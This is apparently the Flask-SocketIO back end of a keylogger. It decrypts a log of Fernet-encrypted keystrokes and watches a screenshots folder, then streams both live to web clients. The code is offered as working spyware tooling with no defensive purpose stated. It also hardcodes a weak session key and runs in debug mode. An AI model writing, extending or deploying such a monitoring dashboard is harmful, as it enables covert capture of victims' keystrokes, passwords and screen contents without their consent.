from flask import Flask, render_template, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet
import threading
import time
import os

# Initialize the Flask application
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'  # Secret key for Flask sessions
socketio = SocketIO(app)  # Initialize SocketIO with Flask app

# Load the encryption key
with open("key.key", "rb") as key_file:
    key = key_file.read()
cipher_suite = Fernet(key)  # Create a cipher suite with the encryption key

log_file = "encrypted_key_log.txt"  # Log file containing encrypted keystrokes
screenshot_dir = "screenshots"  # Directory containing screenshots

# Define the main route to render the index.html template
@app.route('/')
def index():
    return render_template('index.html')

# Serve a specific screenshot file from the screenshots directory
@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

# Return a JSON list of all screenshot filenames in the screenshots directory
@app.route('/get_screenshots')
def get_screenshots():
    screenshots = os.listdir(screenshot_dir)
    screenshots.sort()  # Ensure the order of screenshots is correct
    return jsonify(screenshots)

# Function to monitor the log file for new encrypted keystrokes
def monitor_logs():
    last_position = 0  # Track the last read position in the file
    while True:
        with open(log_file, "rb") as f:
            f.seek(last_position)  # Move to the last read position
            new_data = f.read()  # Read new data from the file
            if new_data:
                try:
                    decrypted_data = cipher_suite.decrypt(new_data).decode()  # Decrypt the new data
                    print(f"Decrypted data: {decrypted_data}")  # Debugging: Print the decrypted data
                    socketio.emit('new_keystroke', {'data': decrypted_data})  # Emit the decrypted data to connected clients
                    last_position = f.tell()  # Update the last read position
                except Exception as e:
                    print(f"Decryption error: {e}")  # Debugging: Print any decryption errors
        time.sleep(1)  # Sleep for a while before checking the file again

# Function to monitor the screenshots directory for new files
def monitor_screenshots():
    existing_files = set(os.listdir(screenshot_dir))  # Track existing files
    while True:
        current_files = set(os.listdir(screenshot_dir))  # Get current files in the directory
        new_files = current_files - existing_files  # Determine new files added
        for new_file in new_files:
            print(f"New screenshot detected: {new_file}")  # Debugging: Print the new file detected
            socketio.emit('new_screenshot', {'filename': new_file})  # Emit the new screenshot filename to connected clients
        existing_files = current_files  # Update the existing files set
        time.sleep(1)  # Sleep for a while before checking the directory again

# Handle a new client connection
@socketio.on('connect')
def handle_connect():
    emit('response', {'data': 'Connected'})  # Emit a response indicating successful connection

# Main entry point of the application
if __name__ == '__main__':
    # Start a thread to monitor the log file
    log_thread = threading.Thread(target=monitor_logs)
    log_thread.start()

    # Start a thread to monitor the screenshots directory
    screenshot_thread = threading.Thread(target=monitor_screenshots)
    screenshot_thread.start()

    # Run the Flask-SocketIO application
    socketio.run(app, debug=True)
